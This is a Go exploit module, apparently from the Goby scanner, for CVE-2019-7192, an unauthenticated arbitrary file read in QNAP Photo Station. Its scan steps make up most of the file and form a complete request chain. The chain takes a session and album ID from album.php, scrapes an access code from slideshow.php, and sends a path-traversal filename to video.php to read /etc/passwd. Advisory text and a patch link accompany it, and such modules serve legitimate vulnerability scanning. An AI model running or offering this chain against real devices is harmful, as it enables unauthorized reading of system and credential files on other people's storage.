package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "QNAP Photo Station the filename parameter of the video.php file is read arbitrarily vulnerability",
    "Description": "<p>QNAP NAS is a suite of network storage devices from QNAP Systems. For home, SOHO, and SME users, QNAP Systems Photo Station is a photo management and viewing application that allows users to bring together photos scattered across multiple terminal devices for management, editing, and sharing, with vulnerabilities in the Photo Station and CGI modules.</p>",
    "Product": "QNAP-NAS",
    "Homepage": "https://www.qnap.com/",
    "DisclosureDate": "2020-05-21",
    "Author": "kankai",
    "FofaQuery": "((((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\"))",
    "GobyQuery": "((((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\"))",
    "Level": "2",
    "Impact": "<p>QNAP NAS is a suite of network storage devices from QNAP Systems. The filename parameter of the /photo/p/api/video.php file of QNAP NAS has an arbitrary file read vulnerability, which is due to the controllable exportFile() parameter, and the identity verification can be bypassed by constructing specific parameters even without authorization, resulting in an arbitrary file read vulnerability, which can allow attackers to view sensitive information and obtain higher privilege access.</p>",
    "Recommendation": "<p>The vulnerability has been fixed officially, and users are requested to download the patch to fix the vulnerability: <a href=\"https://www.qnap.com/zh-tw/security-advisory/nas-201911-25\">https://www.qnap.com/zh-tw/security-advisory/nas-201911-25</a></p>",
    "References": [
        "https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/photo/p/api/album.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "a=setSlideshow&f=qsamplealbum"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "QDocRoot",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "album|lastbody|regex|output>(.*?)</outp",
                "session|lastheader|regex|QMS_SID=(.+?);"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/photo/slideshow.php?album={{{album}}}",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID={{{session}}};QMS_SID={{{session}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nas",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ac|lastbody|regex|encodeURIComponent\\(\\'(.*?)\\'\\)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/photo/p/api/video.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID={{{session}}};QMS_SID={{{session}}}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "album={{{album}}}&a=caption&ac={{{ac}}}&f=&filename=../../../../../../../etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": ":/bin/(\\w*)sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2019-7192"
    ],
    "CNNVD": [
        "CNNVD-201912-239"
    ],
    "CNVD": [
        "CNVD-2020-09622"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "QNAP NAS网络储存设备video.php文件的filename参数任意文件读取",
            "Product": "QNAP-NAS",
            "Description": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">QNAP NAS是威联通（QNAP Systems）公司的一套网络储存设备。用于家庭、SOHO族、以及中小企业用户，QNAP Systems Photo Station是其一款照片管理和查看应用程序，用户可以将分散在多个终端设备的照片汇集到一起进行管理、编辑与分享，漏洞点在于Photo Station及CGI模块。</span><br></p>",
            "Recommendation": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">官方已修复该漏洞，请用户下载补丁修复漏洞：</span><a href=\"https://www.qnap.com/zh-tw/security-advisory/nas-201911-25\">https://www.qnap.com/zh-tw/security-advisory/nas-201911-25</a><br></p>",
            "Impact": "<p>QNAP NAS是威联通（QNAP Systems）公司的一套网络储存设备。QNAP NAS的/photo/p/api/video.php文件的filename参数存在任意文件读取漏洞，该漏洞源于exportFile()参数可控，且即使在未授权的情况下也可通过构造特定参数来绕过身份校验，从而造成任意文件读取漏洞，可使攻击者查看敏感信息，从而获取更高权限访问权限。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "QNAP Photo Station the filename parameter of the video.php file is read arbitrarily vulnerability",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP NAS is a suite of network storage devices from QNAP Systems. For home, SOHO, and SME users, QNAP Systems Photo Station is a photo management and viewing application that allows users to bring together photos scattered across multiple terminal devices for management, editing, and sharing, with vulnerabilities in the Photo Station and CGI modules.<br></p>",
            "Recommendation": "<p>The vulnerability has been fixed officially, and users are requested to download the patch to fix the vulnerability: <a href=\"https://www.qnap.com/zh-tw/security-advisory/nas-201911-25\">https://www.qnap.com/zh-tw/security-advisory/nas-201911-25</a><br></p>",
            "Impact": "<p>QNAP NAS is a suite of network storage devices from QNAP Systems. The filename parameter of the /photo/p/api/video.php file of QNAP NAS has an arbitrary file read vulnerability, which is due to the controllable exportFile() parameter, and the identity verification can be bypassed by constructing specific parameters even without authorization, resulting in an arbitrary file read vulnerability, which can allow attackers to view sensitive information and obtain higher privilege access.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10714"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}


